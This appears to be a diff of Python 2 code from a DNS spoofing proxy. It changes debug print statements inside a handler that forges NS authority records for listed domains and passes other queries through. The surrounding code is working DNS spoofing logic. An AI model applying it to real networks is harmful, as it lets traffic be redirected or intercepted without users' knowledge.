@@ -56,13 +56,11 @@ def handler(data, addr, socket, dns_ip):
                 original_dns_packet[DNS].arcount = 0
                 original_dns_packet[DNS].ns = DNSRR(rrname=original_dns_packet[DNS].qd.qname, type='NS', ttl=84107, rdata=to_be_spoofed[url]['ns'])
                 original_dns_packet[DNS].nscount = 1
-                print "Spoofed packet", original_dns_packet.show()
                 proxy_response = str(original_dns_packet)
             else:
                 print "Request for %s will NOT be spoofed" % url[:-1]
                 proxy_response = server_response[2:]
-            print "Sending DNS response to client"
-            print type(proxy_response), len(proxy_response)
+            print "Sending DNS response to client\n", proxy_response
             ret = socket.sendto(proxy_response, addr)
             if ret:
                 print "Success! Returned ", ret
